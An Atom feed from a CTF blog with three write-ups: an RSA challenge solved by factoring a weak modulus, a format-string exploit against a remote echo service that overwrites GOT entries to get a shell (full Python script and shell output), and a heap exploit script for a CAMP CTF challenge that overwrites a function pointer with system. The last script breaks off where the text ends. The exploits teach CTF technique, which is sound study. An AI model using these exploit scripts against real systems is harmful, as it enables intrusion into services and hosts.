<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Ctf | staring into /dev/null]]></title>
  <link href="http://barrebas.github.io/blog/categories/ctf/atom.xml" rel="self"/>
  <link href="http://barrebas.github.io/"/>
  <updated>2015-09-22T00:08:41+02:00</updated>
  <id>http://barrebas.github.io/</id>
  <author>
    <name><![CDATA[barrebas]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Ekoparty - Cry100]]></title>
    <link href="http://barrebas.github.io/blog/2015/09/21/ekoparty-cry100/"/>
    <updated>2015-09-21T23:54:27+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/09/21/ekoparty-cry100</id>
    <content type="html"><![CDATA[<p>We&rsquo;re given a public key and a encrypted flag, with the task to get the private key. I&rsquo;m not very good at crypto challenges so I wanted to see if I could break this one and learn something in the process.</p>

<!--more-->


<p>The public key is an RSA key:</p>

<pre><code class="bash">$ openssl rsa -inform PEM -pubin -in public.key -text -noout 
Public-Key: (2070 bit)
Modulus:
    25:b1:8b:f5:f3:89:09:7d:17:23:78:66:bb:51:cf:
    f8:de:92:24:53:74:9e:bc:40:3b:09:95:c9:7c:0e:
    38:6d:46:c1:61:ca:df:f7:7c:69:86:0d:ae:47:91:
    c2:14:cf:84:87:aa:aa:9f:26:e9:20:a9:77:83:49:
    06:03:8a:ef:b5:c3:08:27:df:cf:3f:c9:e9:76:95:
    44:f9:4e:07:cd:fe:08:72:03:9a:3a:62:62:11:66:
    78:b2:61:fb:2d:6b:9d:32:53:9e:92:a1:53:b3:67:
    56:29:ba:b3:94:2e:7d:35:e3:0f:7e:ef:5a:bf:1c:
    50:d7:97:d0:cc:88:e1:bd:cc:fd:1a:12:ea:6f:7e:
    f7:5c:37:27:db:df:2e:78:0f:34:28:ae:8f:7a:4f:
    b7:a8:9f:18:4a:36:50:32:b1:53:f8:42:5e:84:57:
    50:eb:2b:7a:bc:02:dc:15:ce:02:07:50:7a:a9:50:
    86:3b:b8:48:0a:78:02:8d:d6:29:79:94:4d:6c:63:
    3f:af:a1:03:e4:db:28:ce:87:f5:a0:c6:ed:4a:2f:
    26:64:42:7f:56:5c:77:81:ab:61:91:45:6d:97:1c:
    7f:fa:39:52:72:37:4c:ec:01:55:e5:f9:11:89:db:
    74:2e:4c:28:b0:3a:0f:a1:1c:ff:b0:31:73:d2:a4:
    cc:e6:ae:53
Exponent: 65537 (0x10001)
</code></pre>

<p>It has a rather weird number of bits, not a multiple of 256. The modulus is converted to hex using python and yields:</p>

<pre><code>n = 79832181757332818552764610761349592984614744432279135328398999801627880283610900361281249973175805069916210179560506497075132524902086881120372213626641879468491936860976686933630869673826972619938321951599146744807653301076026577949579618331502776303983485566046485431039541708467141408260220098592761245010678592347501894176269580510459729633673468068467144199744563731826362102608811033400887813754780282628099443490170016087838606998017490456601315802448567772411623826281747245660954245413781519794295336197555688543537992197142258053220453757666537840276416475602759374950715283890232230741542737319569819793988431443
</code></pre>

<p>Hmm. Since the modulus <code>n</code> is made from the product of two primes, we&rsquo;d better find those primes. Luckily, I found another <a href="http://hacktracking.blogspot.nl/2013/11/cscamp-ctf-quals-2k13-crypto-public-is.html">writeup</a> and a website called <a href="http://factordb.com/index.php?query=79832181757332818552764610761349592984614744432279135328398999801627880283610900361281249973175805069916210179560506497075132524902086881120372213626641879468491936860976686933630869673826972619938321951599146744807653301076026577949579618331502776303983485566046485431039541708467141408260220098592761245010678592347501894176269580510459729633673468068467144199744563731826362102608811033400887813754780282628099443490170016087838606998017490456601315802448567772411623826281747245660954245413781519794295336197555688543537992197142258053220453757666537840276416475602759374950715283890232230741542737319569819793988431443">factordb.com</a>. Factordb does <em>exactly</em> what it says on the box and yields two factors, <code>3133337</code> and another large number. The first number made me think I was on the right way!</p>

<p>Now, we need to reconstruct the key. We have <code>n</code>, <code>p</code> and <code>q</code> which is all we need. I couldn&rsquo;t decrypt the message in Python, as Python&rsquo;s cryptolib requires the modulus to be a multiple of 256 bits. So I resorted to the voodoo magic that is <code>openssl</code>. I found this nice post on stackoverflow <a href="https://stackoverflow.com/questions/19850283/how-to-generate-rsa-keys-using-specific-input-numbers-in-openssl">about creating specific rsa keys</a>.</p>

<p>I followed that post, computing:</p>

<pre><code>d mod(p-1) = e1
d mod(q-1) = e2
q^-1 mod p = coeff
</code></pre>

<p>for which I needed</p>

<pre><code class="python">    def egcd(a, b):
        if a == 0:
            return (b, 0, 1)
        else:
            g, y, x = egcd(b % a, a)
            return (g, x - (b // a) * y, y)

    def modinv(a, m):
        g, x, y = egcd(a, m)
        if g != 1:
            raise Exception('modular inverse does not exist')
        else:
            return x % m
</code></pre>

<p>Then I put everything in a file called <code>newkey.der</code>:</p>

<pre><code>asn1=SEQUENCE:rsa_key

[rsa_key]
version=INTEGER:0
modulus=INTEGER:79832181757332818552764610761349592984614744432279135328398999801627880283610900361281249973175805069916210179560506497075132524902086881120372213626641879468491936860976686933630869673826972619938321951599146744807653301076026577949579618331502776303983485566046485431039541708467141408260220098592761245010678592347501894176269580510459729633673468068467144199744563731826362102608811033400887813754780282628099443490170016087838606998017490456601315802448567772411623826281747245660954245413781519794295336197555688543537992197142258053220453757666537840276416475602759374950715283890232230741542737319569819793988431443
pubExp=INTEGER:65537    
privExp=INTEGER:406853230956379689450620815713768871010712825839536410687962650677800895818003893712259622281477453292088146173840036827322518131453630576229976208523593618949818777897059256426591560532784635697190752924923710375949616954069804342573867253630978123632384795587951365482103468722384133084798614863870775897915929475258974188300927376911833763105616386167881813301748585233563049693794370642976326692672223638908164822104832415788577945314264232531947860576966629150456995512932232264881080618006698700677529111454508900582785420549466798020451488168615035256292977390692401388790460066327347700109341639992159475755036449
p=INTEGER:25478326064937419292200172136399497719081842914528228316455906211693118321971399936004729134841162974144246271486439695786036588117424611881955950996219646807378822278285638261582099108339438949573034101215141156156408742843820048066830863814362379885720395082318462850002901605689761876319151147352730090957556940842144299887394678743607766937828094478336401159449035878306853716216548374273462386508307367713112073004011383418967894930554067582453248981022011922883374442736848045920676341361871231787163441467533076890081721882179369168787287724769642665399992556052144845878600126283968890273067575342061776244939
q=INTEGER:3133337
e1=INTEGER:15320351458978192768467039741691432413958180349660930794740289485182452764579534136107456333762920952821710744567765011085892394594373698903583015958298729593743757394184665648601970820474550408544396720336394444082148339685815042712020243239641617201526913490150693257135882730015443734409342942381805505660243891614007699009146733904940642377373537806159587666380328759209553248526202577679304907571591265191240376778645354498599063176881375334380848007142765855272411310242667619720799140338871500103278100940728801960485534826631133256077779493381175185896255651752489800973249824932460228998596930117032675866465
e2=INTEGER:817841
coeff=INTEGER:0
</code></pre>

<p>The <code>privExp</code> was calculated like this:</p>

<pre><code class="python">import gmpy

def egcd(a, b):
    if a == 0:
        return (b, 0, 1)
    else:
        g, y, x = egcd(b % a, a)
        return (g, x - (b // a) * y, y)

def modinv(a, m):
    g, x, y = egcd(a, m)
    if g != 1:
        raise Exception('modular inverse does not exist')
    else:
        return x % m

p = 25478326064937419292200172136399497719081842914528228316455906211693118321971399936004729134841162974144246271486439695786036588117424611881955950996219646807378822278285638261582099108339438949573034101215141156156408742843820048066830863814362379885720395082318462850002901605689761876319151147352730090957556940842144299887394678743607766937828094478336401159449035878306853716216548374273462386508307367713112073004011383418967894930554067582453248981022011922883374442736848045920676341361871231787163441467533076890081721882179369168787287724769642665399992556052144845878600126283968890273067575342061776244939
q = 3133337
totien = (p-1) * (q-1)
e = 65537
d = modinv(e,totien)
print d
</code></pre>

<p>I then ran <code>$ openssl asn1parse -genconf  newkey.der -out key.der</code>. After mucking around with the flag, I verified I had the right private key by encrypting a test message with the public key. I noticed that the flag was base64 encoded whereas my encrypted message wasn&rsquo;t&hellip;</p>

<pre><code class="bash">$ cat flag.enc |base64 -d &gt; test.enc
$ openssl rsautl -in test.enc -out /dev/tty -inkey private.key -decrypt -oaep
EKO{classic_rsa_challenge_is_boring_but_necessary}
</code></pre>

<p>That last <code>openssl</code> command was just tested with <code>-raw</code> and -<code>oaep</code> (options for padding). <code>-oaep</code> worked!</p>

<p>Flag was <code>EKO{classic_rsa_challenge_is_boring_but_necessary}</code>. I learned something \o/</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Ekoparty - Pwn200]]></title>
    <link href="http://barrebas.github.io/blog/2015/09/21/ekoparty-pwn200/"/>
    <updated>2015-09-21T23:47:44+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/09/21/ekoparty-pwn200</id>
    <content type="html"><![CDATA[<p>Where on earth shall we begin? This one kept us busy for quite some time. The challenge gives no binary, just an address to connect to. Upon connecting, we get some kind of echo server. We quickly noticed a string format vulnerability:</p>

<!--more-->


<pre><code>$ nc challs.ctf.site 20002
&lt;Simple loop greetings v1.3.3.7&gt;
[!] Type bye to quit
Enter your name: %17$s
Hi 3k0_p4rty_2015!
</code></pre>

<p>However this wasn&rsquo;t the flag. As we&rsquo;ll see later, this was part of the challenge. We started dumping the entire binary using the string format vuln. Our format string can be found at offset 8 with 1 byte of padding:</p>

<p>bAAAA%8$x</p>

<pre><code>nc challs.ctf.site 20002
&lt;Simple loop greetings v1.3.3.7&gt;
[!] Type bye to quit
Enter your name: bAAAA%8$x
Hi bAAAA41414141
</code></pre>

<p>From the raw dump, we reconstructed parts of the binary. We came across a string that said &ldquo;OMG! Well done, here&rsquo;s your flag&rdquo; or something along those lines. Looking through the raw dump, we found where that string is referenced. Disassembling with radare2 gave us this:</p>

<pre><code>bas@tritonal:~$ rasm2 -d -o 0x13370861 -
7517c7442404970a37138d45e7890424e86afcffff85c074188d45e789442404c704249a0a3713e883fcffffe9a52a2a2ac70424a20a3713e872fcffff8d45e7890424e867fcffffc70424a60a3713e8cbfcffff8d45e789442404c70424a70a3713e828fcffff85c07566c70424c40a3713e838fcffffa10821371389442404c70424c1203713e8f0fdffff8945dca10821371389442404c70424cc2037130cd8fdffff8945e08b4545dc890424e8f6fbffff8b45dc890424
disassemble error at offset 162
jnz 0x1337087a
mov dword [esp+0x4], 0x13370a97
lea eax, [ebp-0x19]
mov [esp], eax
call dword 0x133704e0
test eax, eax
jz 0x13370892
lea eax, [ebp-0x19]
mov [esp+0x4], eax
mov dword [esp], 0x13370a9a ; 
call dword 0x13370510       ; puts? (value in got is 0xb7e76c40)
jmp dword 0x3d613337
mov dword [esp], 0x13370aa2 ; Hi
call dword 0x13370510
lea eax, [ebp-0x19]
mov [esp], eax
call dword 0x13370510
mov dword [esp], 0x13370aa6
call dword 0x13370580       ; ? (value in got is 0xb7e8ec10)
lea eax, [ebp-0x19]
mov [esp+0x4], eax
mov dword [esp], 0x13370aa7 ; Welcome to ekoparty 2015!
call dword 0x133704f0       ; strcmp? (value in got is 0xb7f60b60)
test eax, eax
jnz 0x13370932
mov dword [esp], 0x13370ac4 ; OMG! nice work, your flag is:
call dword 0x13370510       ; puts?
mov eax, [0x13372108]       ; -&gt; 0x13373008, contains '47fa'
mov [esp+0x4], eax
mov dword [esp], 0x133720c1 ; qs'HG, 7173271f..
call dword 0x133706dd       ; see below
mov [ebp-0x24], eax
mov eax, [0x13372108]
mov [esp+0x4], eax
mov dword [esp], 0x133720cc ; 0x1d0a0c56
or al, 0xd8
std
invalid
</code></pre>

<p>Since our input can never be larger than 12 bytes, we can never win the strcmp with <code>Welcome to ekoparty 2015</code>. From here, we tried a lot of things. The 12 char input limit was annoying, cos we couldn&rsquo;t really write anything, anywhere:</p>

<p><code>A\xde\xad\xbe\xef%255c%8$hn</code> was 15 chars&hellip; So we set out to make a write() function using the format string vuln.</p>

<p>On the stack, there are many DWORDS. Some of them contain stack addresses. Some of those addresses refer to other stack addresses (they&rsquo;re usually stack frame pointers). Using three memory positions, we could construct a write function using format string argument 25, 61 and 124 (ASLR is off so the addresses remain constant). Here&rsquo;s how:</p>

<p>$25 contains the address of $61. Let&rsquo;s assume $25 contains 0xfffff080.</p>

<p>$61 is at 0xfffff080 and contains 0xfffff1a0, which is $124 (math doesn&rsquo;t work out but bear with me).</p>

<p>$124 contains nothing of interest, and isn&rsquo;t used by the binary.</p>

<p>If we now use the format string, we use $61 to write to $124, and $25 to update $61. Finally, once we&rsquo;ve written out an address in $124, we can use the format string to write to that location.</p>

<p>Let&rsquo;s assume we want to write 0x41414141 to 0x804b020. We first do this:</p>

<pre><code>%32c%61$hhn (write 0x20 to 0xfffff1a0). 
</code></pre>

<p>Then, we update the pointer at $61 by writing to $25:</p>

<pre><code>%161c%25$hhn
</code></pre>

<p>So $61 will now contain 0xfffff1a1. Then we write to $124 again via $61:</p>

<pre><code>%176c%61$hhn (write 0xb0 to 0xfffff1a1). 
</code></pre>

<p>Etc until we have 0x804b020 at $124. Then we write using $124:</p>

<pre><code>%65c%124$hhn
</code></pre>

<p>And we&rsquo;ll have written the first byte to 0x804b020. We repeat this process for the other bytes&hellip;</p>

<p>With our new and shiny write() function we set out to break this challenge. We first tried truncating the string &ldquo;Welcome to ekoparty 2015!&rdquo; in memory, so we could have an input that would fit the 12 char limit. Writing to that location didn&rsquo;t work, presumably cos that string was in non-writeable memory. Remember, we needed to enter the code path here:</p>

<pre><code>mov dword [esp], 0x13370aa7 ; Welcome to ekoparty 2015!
call dword 0x133704f0       ; strcmp? (value in got is 0xb7f60b60)
test eax, eax
jnz 0x13370932
mov dword [esp], 0x13370ac4 ; OMG! nice work, your flag is:
call dword 0x13370510       ; puts?
mov eax, [0x13372108]       ; -&gt; 0x13373008, contains '47fa'
mov [esp+0x4], eax
mov dword [esp], 0x133720c1 ; qs'HG, 7173271f..
call dword 0x133706dd       ; see below
mov [ebp-0x24], eax
mov eax, [0x13372108]
mov [esp+0x4], eax
mov dword [esp], 0x133720cc ; 0x1d0a0c56
</code></pre>

<p>We dumped and reversed the function at <code>0x133720cc</code>, which apparently decodes the flag. However, we where only able to get the pieces <code>EKO{</code> and <code>b4by</code>. The dump process wasn&rsquo;t perfect, so we continued.</p>

<p>So how could we get strcmp() to return 0? By overwriting the value in the got with a location that does <code>xor eax, eax; ret</code>. We dumped bytes around the strcmp pointer (ASLR was off so libc was at a static position) and indeed, we identified a rop-like gadget that did just that! Careful overwriting of the got pointer of strcmp in two steps was necessary, but again we lucked out: strcmp was at 0xb7f60b60, the <code>xor eax, eax</code> gadget was at 0xb7f61fc4. At 0xb7f61c60, there was this perfect gadget:</p>

<pre><code>movzx ecx, byte [eax+0x5]
movzx eax, byte [edx+0x5]
sub eax, ecx
ret
</code></pre>

<p>In two steps, we overwrote strcmp (we can&rsquo;t have the got pointer pointing to illegal instructions, cos that would make the binary crash before we can overwrite the next value!) with the xor eax gadget&hellip; and we got something like this:</p>

<pre><code>OMG! nice work, your flag is: EKO{
</code></pre>

<p>And then nothing?! We overwrote the free() got pointer with puts and this dumped more text, convincing us that the overwrite was working correctly. This lead us to believe the binary was broken&hellip; Which indeed it turned out to be, later on.</p>

<p>Next, loads of failed attempts later, we stumbled upon <a href="https://wapiflapi.github.io/2014/11/17/hacklu-oreo-with-ret2dl-resolve/">this writeup of another challenge</a> that uses ret2dl. In other words, abuse the symbol resolver. Quickly after that, we found another good writeup, using a slightly easier technique. It <a href="https://github.com/mrmacete/writeups/tree/master/wapiflapi-exrs/sploit/s7">traverses the link_map</a> found in memory to grab <code>system()</code>.</p>

<p>This turned out to work. We traversed the link_map by hand, adjusting the leaked bytes from time to time (remember, printf chokes on nul bytes).</p>

<p>At the start of the got, we find these bytes:</p>

<pre><code>0x13371f14 ; .dynamic
0xb7fff938 ; *link_map
0xb7ff24f0 ; *dl-resolve
</code></pre>

<p>We take 0xb7fff938, the *link_map, and dump from there. link_map looks like this:</p>

<pre><code class="c">struct link_map
  {
    /* These first few members are part of the protocol with the debugger.
       This is the same format used in SVR4.  */

    ElfW(Addr) l_addr;          /* Base address shared object is loaded at.  */
    char *l_name;               /* Absolute file name object was found in.  */
    ElfW(Dyn) *l_ld;            /* Dynamic section of the shared object.  */
    struct link_map *l_next, *l_prev; /* Chain of loaded objects.  */
  };
</code></pre>

<p>So at 0xb7fff938 we find:
<code>
0x746e450a ; base_addr.. not correct due to printf
0xb7fffc24 ; name! empty
0x13371f14 ; the bin itself... not useful.
0xb7fffc28 ; ptr-&gt;next
</code></p>

<p>This is the binary. On to the next one at 0xb7fffc28, which was linux-gate&hellip; Then the next one was indeed libc! This was confirmed by reading link_map->l_name. We now had the dynamic section of libc, time to parse it for system. Soon, using the printf format string vulnerability and a messy python script, we were dumping symbols. After about an hour, we hit the jackpot:</p>

<pre><code>[+] Opening connection to challs.ctf.site on port 20002: Done
0xb7e2dec8 0x0
0xb7e2ded8 0x1da8
1768709983 __li
0x0
0xb7e2dee8 0xbde
1819570783 _rtl
0x0
0xb7e2def8 0x45d1
1768709983 __li
0x0
0xb7e2df08 0x13f4
...
0xb7e2f948 0x3176
signal
0xb7e2f9a8 0xeab
puts
0xb7e30208 0xa3e
&lt;empty&gt;

0xb7e30588 0x3063
__libc_system
Enter your name:
[!] found system!0x3fcd0 0xb7e69cd0
</code></pre>

<p>We had the address of system! Now, the plan of attack was as follows:</p>

<ul>
<li>write <code>/bin/sh</code> to 0x13373008, which gets used in a free() call</li>
<li>overwrite free@got with system</li>
<li>set strcmp to the <code>xor eax, eax; ret</code> gadget</li>
<li>receive shell</li>
</ul>


<p>This <em>almost</em> worked out, but we set strcmp to 0xb7f61f60 and that turned out to be enough. We landed a shell!</p>

<p>The poc we used:</p>

<pre><code class="python">import socket, struct, telnetlib, time
from pwn import *

context(arch='i386', os='linux')
def p(x):
        return struct.pack('&lt;I', x)

def read1(address):
    conn.send("%64c%25$hhn")           # 0xbffff940
    conn.recv(200)
    conn.send("%"+str(256)+"c%61$hhn")           # set byte at 0xbf..40 to '3c'
    conn.recv(300)

    if (address &amp; 0xff):
        conn.send("%64c%25$hhn")           # 0xbffff940
        conn.recv(200)
        conn.send("%"+str(address &amp; 0xff)+"c%61$hhn")           # set byte at 0xbf..40 to '3c'
        conn.recv(300)

    conn.send("%65c%25$hhn")           # next byte, 0xbffff941
    conn.recv(200)
    conn.send("%"+str((address &gt;&gt; 8) &amp; 0xff)+"c%61$hhn")           # set byte at 0xbf..41 to '20'
    conn.recv(300)

    conn.send("%66c%25$hhn")           # next byte, 0xbffff942
    conn.recv(200)
    conn.send("%"+str((address &gt;&gt; 16) &amp; 0xff)+"c%61$hhn")           # set byte at 0xbf..42 to '37'
    conn.recv(300)

    conn.send("%67c%25$hhn")           # final byte, 0xbffff943
    conn.recv(200)
    conn.send("%"+str((address &gt;&gt; 24) &amp; 0xff)+"c%61$hhn")           # set byte at 0xbf..43 to '13'
    conn.recv(300)

    conn.send("%124$s")

    data = conn.recv(200)
    if data[4:7] == 'Ent':
        return 0
    return ord(data[3:4])

def read4(address):
    value = 0
    for i in range(4):
        #value &lt;&lt;= 8
        value += read1(address+i) &lt;&lt; (8*i)

    return value


def leak(address):
    conn.send("%64c%25$hhn")           # 0xbffff940
    conn.recv(200)
    conn.send("%"+str(256)+"c%61$hhn")           # set byte at 0xbf..40 to '3c'
    conn.recv(300)

    if (address &amp; 0xff):
        conn.send("%64c%25$hhn")           # 0xbffff940
        conn.recv(200)
        conn.send("%"+str(address &amp; 0xff)+"c%61$hhn")           # set byte at 0xbf..40 to '3c'
        conn.recv(300)

    conn.send("%65c%25$hhn")           # next byte, 0xbffff941
    conn.recv(200)
    conn.send("%"+str((address &gt;&gt; 8) &amp; 0xff)+"c%61$hhn")           # set byte at 0xbf..41 to '20'
    conn.recv(300)

    conn.send("%66c%25$hhn")           # next byte, 0xbffff942
    conn.recv(200)
    conn.send("%"+str((address &gt;&gt; 16) &amp; 0xff)+"c%61$hhn")           # set byte at 0xbf..42 to '37'
    conn.recv(300)

    conn.send("%67c%25$hhn")           # final byte, 0xbffff943
    conn.recv(200)
    conn.send("%"+str((address &gt;&gt; 24) &amp; 0xff)+"c%61$hhn")           # set byte at 0xbf..43 to '13'
    conn.recv(300)

    conn.send("%124$s")
    data = conn.recv(200)
    return data[3:]

def write1(what, where):
#       argument 25 contains 0xbffff844,
#                               which points to 0xbffff958
#       so we can use 25 to modify position 61 to write something on the stack!
#       addr = 0xbffff758 # = argument 2
    conn.send("%64c%25$hhn")           # 0xbffff940
    conn.recv(200)
    conn.send("%"+str(where &amp; 0xff)+"c%61$hhn")           # set byte at 0xbf..40 to '3c'
    conn.recv(300)

    conn.send("%65c%25$hhn")           # next byte, 0xbffff941
    conn.recv(200)
    conn.send("%"+str((where &gt;&gt; 8) &amp; 0xff)+"c%61$hhn")           # set byte at 0xbf..41 to '20'
    conn.recv(300)

    conn.send("%66c%25$hhn")           # next byte, 0xbffff942
    conn.recv(200)
    conn.send("%"+str((where &gt;&gt; 16) &amp; 0xff)+"c%61$hhn")           # set byte at 0xbf..42 to '37'
    conn.recv(300)

    conn.send("%67c%25$hhn")           # final byte, 0xbffff943
    conn.recv(200)
    conn.send("%"+str((where) &gt;&gt; 24 &amp; 0xff)+"c%61$hhn")           # set byte at 0xbf..43 to '13'
    conn.recv(300)

    # write byte
    if ord(what) &lt; 100:
        conn.send("%"+str(ord(what))+"c%124$hhn")
    else:
        conn.send("%"+str(ord(what))+"c%124$hn")
    conn.recv(300)

def writebytes(what, where):
    for i in range(len(what)):
        write1(what[i], where+i)

global conn
conn = remote('challs.ctf.site', 20002)
conn.recv(200)

print "[+] writing /bin/sh to 0x13373008"
writebytes('/bin/sh', 0x13373008)

print "[+] writing system() to 0x13372020"
writebytes(struct.pack('I', 0xb7e69cd0), 0x13372020)

print "[+] fucking up strcmp()"
writebytes("\x1f", 0x13372011)

conn.interactive()
</code></pre>

<p>Yeah. Pretty horrible.</p>

<pre><code>bas@tritonal:~/bin/ekoparty-ctf/pwn20$ python pwnpoc.py 
[+] Opening connection to challs.ctf.site on port 20002: Done
[+] writing /bin/sh to 0x13373008
[+] writing system() to 0x13372020
[+] fucking up strcmp()
[*] Switching to interactive mode
$ id
$ id
uid=1001(simple) gid=1001(simple) groups=1001(simple)
$ cd /home/simple
$ ls -al
total 68
drwxr-x--- 2 simple simple  4096 Sep 17 13:45 .
drwxr-xr-x 6 root   root    4096 Sep 12 21:10 ..
-rw------- 1 simple simple   145 Sep 12 21:13 .bash_history
-rw-r--r-- 1 simple simple   220 Oct  7  2014 .bash_logout
-rw-r--r-- 1 simple simple  3637 Oct  7  2014 .bashrc
-rw-r--r-- 1 simple simple   675 Oct  7  2014 .profile
-rwxr-xr-x 1 root   root   27095 Nov 17  2011 checksec.sh
-rw-r--r-- 1 simple simple    35 Sep 14 23:37 flag
-rw-r----- 1 root   simple  1904 Aug 27 01:08 fmt_001.c
-rwxr-x--- 1 root   simple  5776 Aug 27 01:08 greetings
Hi id

OMG! nice work, your flag is: ^\x10LnBye!
[*] Got EOF while reading in interactive
$  
</code></pre>

<p>After 10 seconds, we got kicked out, but that was enough time to grab some files. Sadly, the flag file was not the flag&hellip; someone planted it there (thanks! but no thanks). So we grabbed the C source file:</p>

<pre><code class="c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include  &lt;signal.h&gt;

char *mkey;
unsigned char mkey_crypt[] = { "\x07\x5b\x54\x03\x40\x0f\x4c\x1a\xb2\x0b\x0c\x0b\x04\x77\x1e\x24\x4c\x79\x42\xe7\x2c\xb4\xbf\xa0\x40\x7a\x79\x7a\x32\x0c\x68\xb9\x32\xb7\xf0\x62\xa7\xac\xa6\xe0\x68\x6a\x6f\x54\x28\x59\xa8\x3d\xee\x97\x04\x93\x9f\xcd\xf0\x5b\x0a\x08\x0b\x3e\x5f\xcd\x5f\xaf" };  
unsigned char fmt[] = { "\x71\x73\x27\x1f\x1d\x48\x47" };
unsigned char flag[] = { "\x56\x0c\x0a\x1d\x67\x08\x42\x18\x57\x5c\x53\x4f\x1a\x04\x72\x21\x18\x3a\x31\x05\x49\x26\x2c\x18\x09\x1e\x1a\x70\x5c\x6b" };

char *decrypt(const char *msg, const char *key)
{
    int len_key = strlen(key);
    int len_msg = strlen(msg);
    int i, j;
    char *out = (char *)malloc(len_key + 1);
    if (!out)
    {
        printf("WTF no memory :s");
        return NULL;
    }
    for (i = 0; i &lt; len_msg &amp;&amp; i &lt; sizeof(len_msg); i++)
    {
        out[i] = msg[i] ^ (i + key[i%len_key]);
    }
    return out;
}

void handler(int num)
{
    puts("Bye!");
    exit(-1);
}

void process()
{
    char buff[13];
    puts("&lt;Simple loop greetings v1.3.3.7&gt;");
    puts("[!] Type bye to quit");
    while (1)
    {
        alarm(10);
        printf("Enter your name: ");
        fflush(stdout);
        memset(buff, 0, sizeof(buff));
        read(0, buff, sizeof(buff) - 1);
        if (strstr(buff, "bye"))
        {
            puts("Bye!");
            break;
        }
        if (strstr(buff, "%n") || strstr(buff, "%N"))
        {
            //p: %s\n", buff);
            break;
        }
        printf("Hi ");printf(buff);puts("");
        if (!strcmp("Welcome to ekoparty 2015!", buff))
        {
            printf("OMG! nice work, your flag is: ");
            char *fmt_ = decrypt(fmt, mkey);
            char *flag_ = decrypt(flag, mkey);
            printf(fmt_, flag_);
            free(fmt_);
            free(flag_);
            break;
        }
    }
}

//gcc -m32 Wl,-Ttext-segment=0x13370000 -o greetings fmt_001.c ; strip greetings
int main(int argc, char **argv)
{
    signal(SIGALRM, handler);
    mkey = decrypt(mkey_crypt, "3k0_p4rty_2015!");
    process();
    free(mkey);
}
</code></pre>

<p>Spot the mistake!</p>

<p>Found it? Yeah:</p>

<pre><code>for (i = 0; i &lt; len_msg &amp;&amp; i &lt; sizeof(len_msg); i++)
</code></pre>

<p>Thanks. Anyway, we reimplemented this file in Python (honestly couldn&rsquo;t get the C program to run without segfaulting, bleh).</p>

<pre><code class="python">def decrypt(msg, key):
    out = ""

    for i in range(len(msg)):
        out += chr(ord(msg[i]) ^ (ord(key[i % len(key)]) + i))

    return out


mkey = decrypt("\x07\x5b\x54\x03\x40\x0f\x4c\x1a\xb2\x0b\x0c\x0b\x04\x77\x1e\x24\x4c\x79\x42\xe7\x2c\xb4\xbf\xa0\x40\x7a\x79\x7a\x32\x0c\x68\xb9\x32\xb7\xf0\x62\xa7\xac\xa6\xe0\x68\x6a\x6f\x54\x28\x59\xa8\x3d\xee\x97\x04\x93\x9f\xcd\xf0\x5b\x0a\x08\x0b\x3e\x5f\xcd\x5f\xaf", "3k0_p4rty_2015!")

print decrypt("\x71\x73\x27\x1f\x1d\x48\x47", mkey)
print decrypt("\x56\x0c\x0a\x1d\x67\x08\x42\x18\x57\x5c\x53\x4f\x1a\x04\x72\x21\x18\x3a\x31\x05\x49\x26\x2c\x18\x09\x1e\x1a\x70\x5c\x6b", mkey)
</code></pre>

<p>Which <em>finally</em> gave us the flag:</p>

<pre><code>EKO{\%s}
b4by_3xpl0it_FMT_str1ng_FTW!#$
</code></pre>

<p>The flag was <code>EKO{b4by_3xpl0it_FMT_str1ng_FTW!#$}</code>. Too bad the challenge was broken, nice to learn a new technique!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CAMP CTF - Dkm]]></title>
    <link href="http://barrebas.github.io/blog/2015/08/18/camp-ctf-dkm/"/>
    <updated>2015-08-18T21:36:14+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/08/18/camp-ctf-dkm</id>
    <content type="html"><![CDATA[<p>Writeup coming soon! For now, here&rsquo;s the exploit.</p>

<!--more-->


<pre><code class="python">#!/usr/bin/python
import struct, time
from socket import *

def q(x):
    return struct.pack("&lt;Q", x)

def readtil(delim):
  buf = b''
  while not delim in buf:
      buf += s.recv(1)
  return buf

def add_dkm_without_wifi(comment=""):
    s.send('2\n')
    s.send('2\n')
    s.send('\n')
    s.send('\n')
    s.send(comment+'\n')

def add_dkm_with_wifi(comment):
    s.send('2\n')
    s.send('1\n')
    s.send('\n')
    s.send('\n')
    s.send('\n')
    s.send(comment+'\n')

def edit_dkm_without_wifi(id,comment):
    s.send('4\n')
    s.send(str(id)+'\n')
    s.send('2\n')
    s.send('1\n')
    s.send('1\n')
    s.send(comment+'\n')
    #s.send('\n')

def edit_dkm_with_wifi(id,ssid):
    s.send('4\n')
    s.send(str(id)+'\n')
    s.send('1\n')
    s.send('\n')
    s.send('\n')
    s.send('\n')
    #s.send(ssid+'\n')
    s.send('\n')

def delete_dkm(id):
    s.send('3\n')
    s.send(str(id)+'\n')

def pwn():
    global s
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('challs.campctf.ccc.ac', 10102))
    #s.connect(('localhost', 4444))

    raw_input('dbg')

    readtil('Exit')
    add_dkm_with_wifi('')
    print readtil('Exit')
    print 'adding second wifi'
    add_dkm_with_wifi('')
    print readtil('Exit')

    edit_dkm_without_wifi(0, q(0x602040))

    s.send('1\n')
    readtil('SSID: ')
    data= s.recv(6)

    data += "\x00\x00"
    strtoull = (struct.unpack('&lt;Q', data)[0])
    libc = strtoull - 0x000000000003b1a0 

    print 'libc: %x' % libc
    system = libc + 0x443d0
    print 'system: %x' % system

    print readtil('Exit')
    print 'deleting second wifi'
    delete_dkm(1)
    print readtil('Exit')
    print 'shrinking first wifi'
    edit_dkm_without_wifi(0,'') # resize it
    print readtil('Exit')
    print 'adding second nowifi'
    add_dkm_without_wifi() # allocate new struct next to old dk
    print readtil('Exit')

    # edit first struct (now resized) as large struct, so the comment goes into the next chunk's function pointers
    s.send('4\n')
    s.send('0\n')
    s.send('3\n')
    s.send('1\n')
    s.send('1\n')
    s.send('1\n')
    s.send('1\n')
    #payload = "".join(["%04d" % x for x in range(1023/4)])
    # ugly padding
    payload = "AAAA"+"/bin/sh; #"*80+"AAAA"+q(system)
    s.send(payload+'\n')

    # execute struct-&gt;edit_with_wifi (overwritten with system)
